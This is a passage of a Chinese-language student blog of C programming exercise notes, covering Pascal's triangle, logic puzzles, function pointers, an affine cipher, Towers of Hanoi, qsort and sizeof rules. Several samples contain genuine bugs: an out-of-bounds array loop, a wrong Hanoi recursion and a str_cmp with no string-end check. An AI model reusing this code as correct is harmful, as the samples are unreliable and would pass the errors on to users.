        <content type="html"><![CDATA[<h3 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h3><p>数组要初始化<br>找规律</p><pre><code class="C">#include &lt;stdio.h&gt;// 1// 1 1// 1 2 1// 1 3 3 1// 1 4 6 4 1int main()&#123;    int arr[10][10] = &#123; 0 &#125;;    int i = 0;    int j = 0;    for (i = 0; i &lt;= 10; i++)    &#123;        for (j = 0; j &lt;= i; j++)        &#123;            //第一列全1            if (j == 0)            &#123;                arr[i][j] = 1;            &#125;            //对角线全1            if (i == j)            &#123;                arr[i][j] = 1;            &#125;            if (i &gt;= 2 &amp;&amp; j &gt;= 1)            &#123;                arr[i][j] = arr[i -1][j - 1] + arr[i - 1][j];            &#125;        &#125;    &#125;    for (i = 0; i &lt; 10; i++)    &#123;        for (j = 0; j &lt;= i; j++)        &#123;            printf(&quot;%d &quot;, arr[i][j]);        &#125;        printf(&quot;\n&quot;);    &#125;    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/05/CD8iWgf2mlQUz5G.png" alt="杨辉三角.png"></p><h3 id="凶杀案"><a href="#凶杀案" class="headerlink" title="凶杀案"></a>凶杀案</h3><p>A：不是我</p><p>B：是C </p><p>C：是D </p><p>D：C在胡说 </p><p>三个真话一个假话</p><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123;    //假设法    //1为真0为佳，竖着一组    //A:0 1 1 1    //B:0 0 1 0    //C:0 0 0 1    //D:1 1 1 0    int killer = 0;    for (killer = &#39;A&#39;; killer &lt;= &#39;D&#39;; killer++)    &#123;        if ((killer !=&#39;A&#39;) + (killer == &#39;C&#39;) + (killer == &#39;D&#39;) + (killer != &#39;D&#39;) == 3)            &#123;                printf(&quot;凶手是%c&quot;, killer);            &#125;    &#125;    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/05/Y9X8EFRSamPydft.png" alt="凶手是谁.png"></p><h3 id="趣味问题"><a href="#趣味问题" class="headerlink" title="趣味问题"></a>趣味问题</h3><h4 id="燃香问题"><a href="#燃香问题" class="headerlink" title="燃香问题"></a>燃香问题</h4><p>有一根香材质不均匀，燃完一根需要1h，给你两根香，确认一个15min实践段。</p><p>将第一根香两端点燃，这样就确定了一个30min，同时将第一根香一段点燃<br>在第一根香燃烧完后，第二根香就剩30min了，这样再按照第一根香的方法就确定了15min</p><h3 id="拆名次"><a href="#拆名次" class="headerlink" title="拆名次"></a>拆名次</h3><p>A：B第二，我第三<br>B：我第二，E第四<br>C:我第一，D第二<br>D：C最后，我第三<br>E:我第四，A第一<br>每位选手都说对了一半</p><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123;    int a = 0;    int b = 0;    int c = 0;    int d = 0;    int e = 0;    for (a = 1; a &lt;= 5; a++)    &#123;        for (b = 1; b &lt;= 5; b++)        &#123;            for (c = 1; c &lt;= 5; c++)            &#123;                for (d = 1; d &lt;= 5; d++)                &#123;                    for (e = 1; e &lt;= 5; e++)                    &#123;                        if (((b == 2) + (a == 3) == 1)                        &amp;&amp; ((b == 2) + (e == 4) == 1)                         &amp;&amp; ((c == 1) + (d == 2) == 1)                         &amp;&amp; ((c == 5) + (d == 3) == 1)                         &amp;&amp; ((e == 4) + (a == 1) == 1)                        )                        &#123;                            if (a * b * c * d * e == 120)                                printf(&quot;a=%d b=%d c=%d d=%d e=%d \n&quot;, a, b, c, d, e);                        &#125;                    &#125;                &#125;            &#125;        &#125;    &#125;    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/05/waoOR93i4FNjuSV.png" alt="排名.png"></p><h3 id="二维数组列排序"><a href="#二维数组列排序" class="headerlink" title="二维数组列排序"></a>二维数组列排序</h3><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123;    int i, j, k, b[20][20];    int m,n;    scanf(&quot;%d %d&quot;, &amp;m, &amp;n);    for(i = 0; i &lt; m; i++)        for(j = 0; j &lt; n; j++)            scanf(&quot;%d&quot;,  &amp;b[i][j]);    int temp = 0;    for(i = 0; i &lt; n; i++)&#123;        for(j = 0; j &lt; m; j++)&#123;            for(k = 0; k &lt; m - j - 1; k++)&#123;                if(b[k][i] &lt; b[k + 1][i])&#123;                    temp = b[k][i];                    b[k][i] = b[k + 1][i];                    b[k + 1][i] = temp;                &#125;             &#125;        &#125;    &#125;    for(i=0;i&lt;m;i++)&#123;            for(j=0;j&lt;n;j++)                printf(&quot;%d &quot;, b[i][j]);    printf(&quot;\n&quot;);    &#125;    return 0;            &#125;</code></pre><p><img src="https://s2.loli.net/2023/03/05/4RasZXYOAuoQJh9.png" alt="1111.png"></p><h3 id="3-7-指针"><a href="#3-7-指针" class="headerlink" title="3_7-指针"></a>3_7-指针</h3><h4 id="一级指针传参"><a href="#一级指针传参" class="headerlink" title="一级指针传参"></a>一级指针传参</h4><pre><code class="C">#define _CRT_SECUTE_NO_WARNIG#include &lt;stdio.h&gt;void print(int* ptr, int sz)&#123;    int i = 0;    for (i = 0; i &lt; sz; i++)    &#123;        printf(&quot;%d &quot;, *(ptr + i));    &#125;&#125;void test(char* p)&#123;&#125;// 一级指针传参int main()&#123;    int arr[10] = &#123; 1,2,3,4,5,6,7,8,9,10 &#125;;    int* p = arr;    int sz = sizeof(arr) / sizeof(arr[0]);    //p是一级指针    print(p, sz);    char* ch = &#39;w&#39;; // 数组名是首地址    char* p1 = &amp;ch; //对于其它类型的变量需要取地址    test(&amp;ch);      //取地址完再存放到同类型的指针变量也行    test(p1);    return 0;&#125;</code></pre><h4 id="二级指传参"><a href="#二级指传参" class="headerlink" title="二级指传参"></a>二级指传参</h4><pre><code class="C">#define _CRT_SECUTE_NO_WARNIG#include &lt;stdio.h&gt;void test(int** p2)&#123;    **p2 = 20;&#125;int main()&#123;    int a = 10;    int* pa = &amp;a;//pa一级指针    int** ppa = &amp;pa;//ppa是二级指针    //把二级指针进行传参？    test(ppa);    test(&amp;pa);//传一级指针变量的地址    printf(&quot;%d\n&quot;, a);    return 0;&#125;</code></pre><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><pre><code class="C">#define _CRT_SECUTE_NO_WARNIG#include &lt;stdio.h&gt;int Add(int x, int y)&#123;    return x + y;&#125;int main()&#123;    int a = 10;    int* pa = &amp;a;        char ch = &#39;w&#39;;    char* pc = &amp;ch;    int arr[10] = &#123; 0 &#125;;    int (*parr)[10] = &amp;arr;//取出数组的地址    //parr 是指向数组的指针 - 存放的是数组的地址        //函数指针-存放函数地址的指针    //&amp;函数名- 取到的是函数的地址    //数组名 != &amp;数组名 函数名 == &amp;函数名    //pf就是一个函数指针变量    int (*pf)(int, int) = &amp;Add;//        //printf(&quot;%p\n&quot;, &amp;Add);    //printf(&quot;%p\n&quot;, Add);//结果一样    return 0;&#125;</code></pre><p>练习</p><pre><code class="C">void test(char* str)&#123;&#125;int main()&#123;    void (*pt)(char*) = &amp;test;    return 0;&#125;</code></pre><p>使用</p><pre><code class="C">int Add(int x, int y)&#123;    return x + y;&#125;int main()&#123;    int (*pf)(int, int) = &amp;Add;//    int ret = (*pf)(3, 5);    printf(&quot;%d\n&quot;, ret);    return 0;&#125;//另外的写法/*int main()&#123;    int (*pf)(int, int) = Add;//    //int ret = (*pf)(3, 5);    int ret = pf(3, 5);    printf(&quot;%d\n&quot;, ret);    return 0;&#125;*/</code></pre><h4 id="阅读俩段代码"><a href="#阅读俩段代码" class="headerlink" title="阅读俩段代码"></a>阅读俩段代码</h4><pre><code class="C">//代码1(*(void (*)())0)();//调用0地址的函数，该函数无参，发返回类型是void//1.void (*)() 函数指针类型//2. ((void (*)()0 对0进行强制类型转化，被解释为一个函数地址//3.(*(void (*)())0)() 调用0地址处的函数//代码2void (*signal(int , void(*)(int)))(int);////1. signal(int, void(*)(int)) + void(*)(int)//2.signal和()先结合，说明signal是函数名//3.signal函数的第一个参数类型是int，第二个参数的类型是函数指针//该函数指针指向一个参数为int返回类型是void的函数//4.signal函数的返回类型也是一个函数指针该函数指针指向一个参数为int，返回类型是void的函数//5.signal是一个函数的声明typedef void(*pfun_t)(int);//对void(*)(int)的函数指针型重命名为pfun_t//typedef unsigned int uint;pfun_t signal(int, pfun_t);</code></pre><h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;conio.h&gt;void Affine() /* 仿射密码 */&#123;    char c[100];    int length, i = 0, ka = 0, kb = 0, tmp;    system(&quot;cls&quot;);    printf(&quot;********仿射密码********\n请输入最初的明文:&quot;);    gets(c);    length = strlen(c);    printf(&quot;请输入秘钥（两数字）：&quot;);    scanf(&quot;%d %d&quot;, &amp;ka, &amp;kb);    getchar();    while (gcd(ka,26) != 1)    &#123;        printf(&quot;秘钥输入错误，请重新输入：&quot;);        scanf(&quot;%d %d&quot;, &amp;ka, &amp;kb);        getchar();      &#125;      for (i = 0; i &lt; length; i++)     &#123;        //大写字母         if (c[i] &gt; 96 &amp;&amp; c[i] &lt; 123)            c[i] = (ka * (c[i] - 97) + kb) % 26 + 97;        //小写字母         else if (c[i] &gt; 64 &amp;&amp; c[i] &lt; 91)            c[i] = (ka * (c[i] - 65) + kb) % 26 + 65;        &#125;    printf(&quot;\n密文为：\n%s\n&quot;, c);    //printf(&quot;********请安1~3选择：********\n&quot;);    //printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);    &#125;int gcd(int a, int b) /* 求最大公因数 */ &#123;    int k = 0;    do    &#123;        k = a % b;        a = b;        b = k;    &#125; while(k != 0);    return a; &#125; void exAffine() /* 仿射加密 */&#123;    char c[100];    int length, i = 0, ka = 0, kb = 0, tmp;    system(&quot;cls&quot;);    printf(&quot;********仿射密码*******\n请输入最初的密文：&quot;);    gets(c);    length = strlen(c);    printf(&quot;请输入秘钥（两数字）：&quot;);    scanf(&quot;%d %d&quot;, &amp;ka, &amp;kb);    getchar();    while (gcd(ka,26) != 1)    &#123;        printf(&quot;秘钥输入错误，请重新输入：&quot;);        scanf(&quot;%d %d&quot;, &amp;ka, &amp;kb);        getchar();      &#125;      for (i = 0; i &lt; length; i++)     &#123;        //大写字母         if (c[i] &gt; 64 &amp;&amp; c[i] &lt; 91)        &#123;            tmp = Ni(ka, 26) * ((c[i] - 65) - kb);            if (tmp &lt; 0)                c[i] = tmp % 26 + 26 + 65;            else                c[i] = tmp % 26 + 65;         &#125;         //小写字母          if (c[i] &gt; 96 &amp;&amp; c[i] &lt; 123)         &#123;            tmp = Ni(ka, 26) * ((c[i] - 97) - kb);            if (tmp &lt; 0)                c[i] = tmp % 26 + 26 + 97;            else                c[i] = tmp % 26 + 97;         &#125;      &#125;     printf(&quot;\n明文为：\n %s \n&quot;, c);    //printf(&quot;********请安1~3选择：********\n&quot;);    //printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);     &#125; int Ni(int a, int b)&#123;    int i = 0;    while (a * (++i) % b != 1);    return i;&#125;int main()&#123;    char i = &#39;0&#39;;    printf(&quot;********请按1~3选择：********\n&quot;);    printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);    //scanf(&quot;%c&quot;, &amp;i);    //getchar();    i = getch();     while (i != &#39;3&#39;)    &#123;        if (i == &#39;1&#39;)            Affine();        else if (i == &#39;2&#39;)            exAffine();                printf(&quot;********请按1~3选择：********\n&quot;);        printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);        i = getch();    &#125;    return 0; &#125;  </code></pre><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><pre><code class="C">#include &lt;stdio.h&gt;/* 俩层 /*  三层 1: A-&gt;C2: A-&gt;B A-&gt;C B-&gt;C3: A-&gt;C A-&gt;B C-&gt;B A-&gt;C B-&gt;A B-&gt;C A-&gt;C*/ void move(char pos1, char pos2)&#123;    printf(&quot;%c-&gt;%c &quot;, pos1, pos2); &#125; void Hanoi(int n, char pos1, char pos2, char pos3)&#123;    if (n == 1)    &#123;        move(pos1, pos3);       &#125;    else    &#123;        Hanoi(n - 1, pos1, pos2, pos3);        move(pos1, pos3);        Hanoi(n - 1, pos2, pos1, pos3);    &#125;&#125;/*N:代表盘子个数pos1:起始位置 pos2:中转位置pos3:目的位置*/ int main()&#123;    Hanoi(1, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;);    printf(&quot;\n&quot;);    Hanoi(2, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;);    printf(&quot;\n&quot;);    Hanoi(3, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;);    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/09/17KRvbOmujZaqi8.png" alt="image.png"></p><h3 id="3-10"><a href="#3-10" class="headerlink" title="3_10"></a>3_10</h3><pre><code class="C">#include &lt;stdio.h&gt;int Add(int x, int y)&#123;    return x + y; &#125; int Sub(int x, int y)&#123;    return x - y;&#125;int Mul(int x, int y)&#123;    return x * y;&#125;int div(int x, int y)&#123;    return (x / y);&#125; void menu()&#123;    printf(&quot;1.add\n&quot;);    printf(&quot;2.sub\n&quot;);    printf(&quot;3.mul\n&quot;);    printf(&quot;4.div\n&quot;);    printf(&quot;0.exit\n&quot;); &#125; int main()&#123;    int (*pf1)(int, int) = Add;    int (*pf2)(int, int) = Sub;    // pfArr[2] + int(*)(int, int)      int (*pfArr[2])(int, int) = &#123;Add, Sub&#125;;    //*pfArr 就是函数指针数组         //计算器-计算整型变量的加、减、乘、除。     int input = 0;    do &#123;        menu();                int x = 0;        int y = 0;        int ret = 0;        printf(&quot;请选择：&gt;&quot;);        scanf(&quot;%d&quot;, &amp;input);        switch (input)        &#123;            case 1:                printf(&quot;请输入俩个操作数&gt;:&quot;);                scanf(&quot;%d %d&quot;, &amp;x, &amp;y);                ret = Add(x, y);                break;            case 2:                printf(&quot;请输入俩个操作数&gt;:&quot;);                scanf(&quot;%d %d&quot;, &amp;x, &amp;y);                ret = Sub(x, y);                break;            case 3:                printf(&quot;请输入俩个操作数&gt;:&quot;);                scanf(&quot;%d %d&quot;, &amp;x, &amp;y);                ret = Mul(x, y);                break;            case 4:                printf(&quot;请输入俩个操作数&gt;:&quot;);                scanf(&quot;%d %d&quot;, &amp;x, &amp;y);                ret = div(x, y);                break;            case 0:                printf(&quot;退出程序&quot;);                input = 0;                break;            default:                printf(&quot;选择错误，请重新选择&quot;);                break;         &#125;        printf(&quot;ret = %d\n&quot;, ret);    &#125; while (input);    return 0;                return 0;&#125;</code></pre><p>方法二</p><pre><code class="C">int main()&#123;    //计算器-计算整型变量的加、减、乘、除。    //a&amp;b a^b a|b a&gt;&gt;b a&lt;&lt;b a&gt;b     int input = 0;        do &#123;        menu();        int (*pfArr[5])(int, int) = &#123;NULL, Add, Sub, Mul, div&#125;;        int x = 0;        int y = 0;        int ret = 0;        printf(&quot;请选择：&gt;\n&quot;);        scanf(&quot;%d&quot;, &amp;input);        if (input &gt;= 1 &amp;&amp; input &lt;= 4)        &#123;            printf(&quot;请输入2个操作数&gt;:&quot;);            scanf(&quot;%d %d&quot;, &amp;x, &amp;y);             ret = (pfArr[input])(x, y);            printf(&quot;ret = %d\n&quot;, ret);        &#125;        else if (input == 0)        &#123;            printf(&quot;退出\n&quot;);            break;        &#125;        else        &#123;            printf(&quot;选择错误\n&quot;);        &#125;       &#125; while (input);    return 0;&#125;</code></pre><p>描述<br>KiKi写了一个输出“Hello world!”的程序，BoBo老师告诉他printf函数有返回值，你能帮他写个程序输出printf(“Hello world!”)的返回值吗？<br>输入描述：<br>无<br>输出描述：<br>包括两行：<br>第一行为“Hello world!”<br>第二行为printf(“Hello world!”)调用后的返回值。</p><pre><code class="C">#include &lt;stdio.h&gt;//printf函数源码//int __cdecl printf(const char * __restrict__ _Format,...);int main() &#123;    int a = printf(&quot;Hello world!&quot;);    printf(&quot;\n&quot;);    printf(&quot;%d&quot;,  a);    return 0;&#125;</code></pre><h3 id="BC15-大小写转换"><a href="#BC15-大小写转换" class="headerlink" title="BC15 大小写转换"></a>BC15 大小写转换</h3><pre><code class="C">#include&lt;stdio.h&gt;int main() &#123;    int ch = 0;    while ((ch = getchar()) != EOF) &#123;     //EOF意为-1。本语句即只要输入项是字符即可打印        getchar();        putchar(ch + 32);        printf(&quot;\n&quot;);    &#125;    return 0;&#125;</code></pre><h3 id="指针进阶6"><a href="#指针进阶6" class="headerlink" title="指针进阶6"></a>指针进阶6</h3><p>复习冒泡排序</p><pre><code class="C">#include &lt;stdio.h&gt;void bubble_sort(int arr[], int sz)&#123;    int i = 0;    int j = 0;    for (i = 0; i &lt; sz; i++)&#123;        for(j = 0; j &lt; sz - 1 - i; j++)&#123;            if (arr[j] &gt; arr[j + 1])&#123;                int tmp = arr[j + 1];                arr[j + 1] = arr[j];                arr[j] = tmp;            &#125;        &#125;            &#125;       &#125;void print(int arr[], int sz)&#123;    int i = 0;    for (i = 0; i &lt; sz; i++)&#123;        printf(&quot;%d &quot;, arr[i]);    &#125;    printf(&quot;\n&quot;);&#125;int main()&#123;    int arr[10] = &#123;9,8,7,6,5,4,3,2,1,0&#125;;    int sz = sizeof(arr) / sizeof(arr[0]);    bubble_sort(arr, sz);    print(arr, sz);     return 0; &#125; </code></pre><p><img src="https://s2.loli.net/2023/03/12/rOnPdWCTq8RmgYL.png" alt="image.png"></p><h4 id="qsort-x2F-x2F-快速排序"><a href="#qsort-x2F-x2F-快速排序" class="headerlink" title="qsort();&#x2F;&#x2F;快速排序"></a>qsort();&#x2F;&#x2F;快速排序</h4><p>整型数据，字符串数据，结构体数据都可以排</p><pre><code class="C">#include &lt;stdlib.h&gt;void qsort(void *base,//base 中存放的是待排序数据中第一个对象的地址                  size_t nitems, //num 是待排序数据的元素个数                 size_t size, //size 排序中一个元素的大小                  int (*compar)(const void *, const void*) //指向函数的指针，用于确定排序的顺序（需要用户自定义一个比较函数）                  )</code></pre><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;//因为void不知道什么类型，所以要先强制转换类型，而qsort对比较函数只要求和0的关系//所以直接return 差值即可 int cmp_int(const void* e1, const void* e2)&#123;    return *(int*)e1 - *(int*)e2; &#125; void print(int arr[], int sz)&#123;    int i = 0;    for (i = 0; i &lt; sz; i++)&#123;        printf(&quot;%d &quot;, arr[i]);    &#125;    printf(&quot;\n&quot;);&#125;int main()&#123;    int arr[10] = &#123;9,8,7,6,5,4,3,2,1,0&#125;;    int sz = sizeof(arr) / sizeof(arr[0]);    qsort(arr, sz, sizeof(arr[0]), cmp_int);    print(arr, sz);     return 0; &#125; </code></pre><p><img src="https://s2.loli.net/2023/03/12/PoDyjkpAuZ8CMmf.png" alt="image.png"></p><h4 id="qsort函数排序结构体"><a href="#qsort函数排序结构体" class="headerlink" title="qsort函数排序结构体"></a>qsort函数排序结构体</h4><p>1.按年龄排序</p><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; struct Stu&#123;    char name[20];    int age;&#125;; int sort_by_age(const void* e1, const void* e2)&#123;    return ((struct Stu*)e1)-&gt;age - ((struct Stu*)e2)-&gt;age;&#125;void print(struct Stu s[], int sz)&#123;    int i = 0;    struct Stu *p;    p = s;    for (i = 0; i &lt; sz; i++)    &#123;           printf(&quot;Stu%d\n&quot;,i);        printf(&quot;name:%s\n&quot;, p-&gt;name);        printf(&quot;age:%d\n&quot;, p-&gt;age);        printf(&quot;\n&quot;);        p++;    &#125;&#125;void test2()&#123;    //使用qsort排序结构体数据     struct Stu s[] = &#123;        &#123;&quot;zhangsan&quot;, 30&#125;,        &#123;&quot;liso&quot;, 35&#125;,        &#123;&quot;wangwu&quot;, 20&#125;    &#125;;    int sz = sizeof(s) / sizeof(s[0]);    //按年龄排序        qsort(s, sz, sizeof(s[0]), sort_by_age);    print(s, sz);&#125;int main()&#123;        test2();            return 0; &#125; </code></pre><p><img src="https://s2.loli.net/2023/03/12/I8lagQoBthpbJdj.png" alt="image.png"></p><p>2.按名字排序</p><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;struct Stu&#123;    char name[20];    int age;&#125;; int sort_by_name(const void* e1, const void* e2)&#123;    return strcmp(((struct Stu*)e1)-&gt;name, ((struct Stu*)e2)-&gt;name);&#125;void print(struct Stu s[], int sz)&#123;    int i = 0;    struct Stu *p;    p = s;    for (i = 0; i &lt; sz; i++)    &#123;           printf(&quot;Stu%d\n&quot;,i);        printf(&quot;name:%s\n&quot;, p-&gt;name);        printf(&quot;age:%d\n&quot;, p-&gt;age);        printf(&quot;\n&quot;);        p++;    &#125;&#125;void test2()&#123;    //使用qsort排序结构体数据     struct Stu s[] = &#123;        &#123;&quot;zhangsan&quot;, 30&#125;,        &#123;&quot;liso&quot;, 35&#125;,        &#123;&quot;wangwu&quot;, 20&#125;    &#125;;    int sz = sizeof(s) / sizeof(s[0]);    //按名字排序    printf(&quot;突然想看下s中元素的大小%d\n&quot;,sizeof(s[0]));    qsort(s, sz, sizeof(s[0]), sort_by_name);    print(s, sz);&#125;int main()&#123;        test2();            return 0; &#125; </code></pre><p><em>一个char 8bit&#x3D;1byte 一个int 4byte 所以是24</em><br><img src="https://s2.loli.net/2023/03/12/LwpS6mz3bsEPlid.png" alt="image.png"></p><p>3.突然想看下string.h中的strcmp源码</p><pre><code class="C">int __cdecl strcmp (        const char * src,        const char * dst        )&#123;        int ret = 0 ;        while((ret = *(unsigned char *)src - *(unsigned char *)dst) == 0 &amp;&amp; *dst)                &#123;                ++src, ++dst;                &#125;        return ((-ret) &lt; 0) - (ret &lt; 0); // (if positive) - (if negative) generates branchless code&#125;</code></pre><p>看不懂，试着自己实现一个</p><pre><code class="C">int str_cmp(const char *str1, const char* str2)&#123;    while (*str1 == *str2) &#123;        str1++;        str2++;    &#125;    int ret = *str1 - *str2;    return ret; &#125;int main()&#123;    char str1[] = &quot;abcde&quot;;    char str2[] = &quot;bca&quot;;    printf(&quot;%d&quot;,str_cmp(str1, str2));    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/12/U2tR96KOhZ5X7YP.png" alt="image.png"></p><h2 id="模仿qsort实现冒泡排序"><a href="#模仿qsort实现冒泡排序" class="headerlink" title="模仿qsort实现冒泡排序"></a>模仿qsort实现冒泡排序</h2><pre><code class="C">#include &lt;stdio.h&gt;void Swap(char* buf1, char* buf2, int width)&#123;    int i = 0;    for (i = 0; i &lt; width; i++)    &#123;        char tmp = *buf1;        *buf1 = *buf2;        *buf2 =tmp;        buf1++;        buf2++;    &#125;&#125;//模仿qsort实验一个冒泡排序的通用算法 void bubble_sort(void* base,                int sz,//元素个数                 int width, //元素大小（几个字节）                 int (*cmp)(const void* e1, const void* e2)                )&#123;    int i = 0;    //sz个元素进行sz-1趟     for (i = 0; i &lt; sz -1; i++)    &#123;        //一趟排序         int j = 0;        for (j = 0; j &lt; sz - 1 - i; j++)        &#123;            //两个元素比较             //arr[j] arr[j+1]            if (cmp((char*)base + j * width, (char*)base + (j + 1) * width) &gt; 0)            &#123;                //交换                 Swap((char*)base + j * width, (char*)base + (j + 1) * width, width);            &#125;         &#125;             &#125;&#125;int cmp_int(const void* e1, const void* e2)&#123;    return *(int*)e1 - *(int*)e2;&#125;void print_arr(int arr[], int sz)&#123;    int i = 0;    for (i = 0; i &lt; sz; i++)&#123;        printf(&quot;%d &quot;, arr[i]);    &#125;    printf(&quot;\n&quot;);&#125;void test()&#123;    int arr[] = &#123; 1,3,5,6,7,8,2,4,0,9 &#125;;    int sz = sizeof(arr) / sizeof(arr[0]);    bubble_sort(arr, sz, sizeof(arr[0]), cmp_int);    print_arr(arr, sz);&#125;int main()&#123;    test();    return 0;&#125; </code></pre><h2 id="折半排序"><a href="#折半排序" class="headerlink" title="折半排序"></a>折半排序</h2><pre><code class="C">#include &lt;stdio.h&gt; void CelerityRun(int left, int right, int array[]);int main()&#123;    int i;    int a[10];    for (i = 0; i &lt; 10; i++)    &#123;        scanf(&quot;%d&quot;, &amp;a[i]);    &#125;    CelerityRun(0, 9, a);    for(i = 0; i &lt; 10; i++)    &#123;        printf(&quot;%d\t&quot;, a[i]);        if(i == 4)            printf(&quot;\n&quot;);    &#125;    return 0;&#125;void CelerityRun(int left, int right, int array[])&#123;    int i,j;    int middle,iTemp;    i = left;    j = right;    middle = array[(left+right) / 2]; //求中间值     do    &#123;        while((array[i] &lt; middle) &amp;&amp; (i &lt; right)) //从左找小于中间值的数             i++;        while((array[j] &gt; middle) &amp;&amp; (j &gt; left)) //从右找大于中间值的数             j--;        if (i &lt;= j)        &#123;            iTemp = array[i];            array[i] = array[j];            array[j] = iTemp;            i++;            j--;        &#125;    &#125;while(i &lt;= j);    /* 递归左半边 */    if (left &lt; j)        CelerityRun(left, j, array);    /* 递归右半边 */     if (right &gt; i)        CelerityRun(i, right, array);&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/19/WOIY92Lg7FAVKlo.png" alt="image.png"></p><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123;    int a[3][4];    printf(&quot;%d\n&quot;, (int)sizeof(a));//48=3*4*sizeof(int)     printf(&quot;%d\n&quot;, (int)sizeof(a[0][0]));//4 - a[0][0]-是第一行第一个元素     printf(&quot;%d\n&quot;, (int)sizeof(a[0]));//16 第一行 4*4个int     printf(&quot;%d\n&quot;, (int)sizeof(a[0]+1));//4                                         /*a[0]作为数组名并没有单独放在sizeof内部                                          *也没取地址，所以a[0]是第一行第一个算的地址                                          *a[0]+1，就是第一行第二个元素的地址                                          *                                         */    printf(&quot;%d\n&quot;, (int)sizeof(*(a[0]+1)));//*(a[0]+1)==a[0][1] int 4 byte 第一行第二个元素     printf(&quot;%d\n&quot;, (int)sizeof(a+1));//4/8  a是首元素地址，而二维数组数组名的首元素是第一行，                                     //第一行的地址+1就是第二行的地址     printf(&quot;%d\n&quot;, (int)sizeof(*(a+1)));//16 对第二行解引用，有4个元素，     printf(&quot;%d\n&quot;, (int)sizeof(&amp;a[0]+1));//4/8 第一行的地址+1就是第二行的地址     printf(&quot;%d\n&quot;, (int)sizeof(*(&amp;a[0]+1)));//16 第二行解引用     printf(&quot;%d\n&quot;, (int)sizeof(*a));//16 首元素即第一行地址，再解引用 ，没有&amp;没有单独放在sizeof内部     printf(&quot;%d\n&quot;, (int)sizeof(a[3]));//16 a[3]其实是第四行的数组名，（如果有的话）                                      // 所以其实不存在，但是也能通过类型计算大小     return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/25/p3ZUYXCMebPDJ2o.png" alt="image.png"><br>3+5<br>表达式</p><ol><li>值属性 8</li><li>类型性 int</li><li>a[3属]的类型 - int [4]</li></ol><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123;    short s = 5;    int a = 4;    printf(&quot;%d\n&quot;, sizeof(s = a + 6));//2 由s决定     printf(&quot;%d\n&quot;, s);//5  sizeof内部的表达式不会计算,只看类型        return 0; &#125;</code></pre><h4 id="总结：数组名的意义"><a href="#总结：数组名的意义" class="headerlink" title="总结：数组名的意义"></a>总结：数组名的意义</h4><ol><li>sizeof(数组名)，这里的数组名表示整个数组，计算的是整个数组的大小</li><li>&amp;数组名，这里的数组名表示整个数组，取出的是整个数组的地址</li><li>除此之外所有的数组名都表示首元素的地址</li></ol><h2 id="PAT-答题卡"><a href="#PAT-答题卡" class="headerlink" title="PAT 答题卡"></a>PAT 答题卡</h2><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;string.h&gt;int Iswhat(char a[])&#123;    int flag = 0;    int len = strlen(a);    int i = 0;    for (i = 0; i &lt; len; i++) &#123;        if (a[i] == &#39;;&#39;)&#123;            flag = 1;            break;        &#125;        else if (a[i] == &#39;/&#39;)&#123;            flag = 2;            break;        &#125;    &#125;    return flag; &#125;  void init(char s[]) &#123;    int i = 0;    int len = strlen(s);    for (i = 0; i &lt; len; i++) &#123;        s[i] = &#39;\0&#39;;     &#125; &#125;int main()&#123;    int n ,m, x, y;    int i = 0;    int j = 0;    char s[6] = &#123; 0 &#125;;    char a[90][90] = &#123;&#125;;    scanf(&quot;%d %d&quot;, &amp;n, &amp;m);    for (i = 0; i &lt; n; i++)        for (j = 0; j &lt; n; j++)            a[i][j] = &#39;.&#39;;    for (i = 0; i &lt; m; i++) &#123;        init(s);        scanf(&quot;%s&quot;, &amp;s);        if (Iswhat(s) == 0) &#123;            //printf(&quot;%s &quot;, s);            int len = strlen(s);            printf(&quot;%d\n&quot;, len);            if (len == 1) &#123;                x = 0;                y = int(s[len - 1] - &#39;0&#39;) - 1;                             &#125;            else if (len == 2) &#123;                x = 0;                y = int(s[len - 2] - &#39;0&#39;) * 10 + int(s[len - 1] - &#39;0&#39;);            &#125;            else if (len == 3) &#123;                x = int(s[len - 3] - &#39;0&#39;);                y = int(s[len - 2] - &#39;0&#39;) * 10 + int(s[len - 1] - &#39;0&#39;);            &#125;            else &#123;                x = int(s[len - 4] - &#39;0&#39;) * 10 + int(s[len - 3] - &#39;0&#39;);                y = int(s[len - 2] - &#39;0&#39;) * 10 + int(s[len - 1] - &#39;0&#39;);            &#125;            //printf(&quot;%d %d\n&quot;, x, y);            a[n - y][x - 1] = &#39;#&#39;;        &#125;        else if (Iswhat(s) == 1) &#123;            int len = strlen(s);            if(len == 5) &#123;                x = int(s[len - 5] - &#39;0&#39;) * 10 + int(s[len - 4] - &#39;0&#39;);                y = int(s[len - 2] - &#39;0&#39;) * 10 + int(s[len - 1] - &#39;0&#39;);            &#125;            else if(len == 3) &#123;                x = int(s[len - 3] - &#39;0&#39;);                y = int(s[len - 1] - 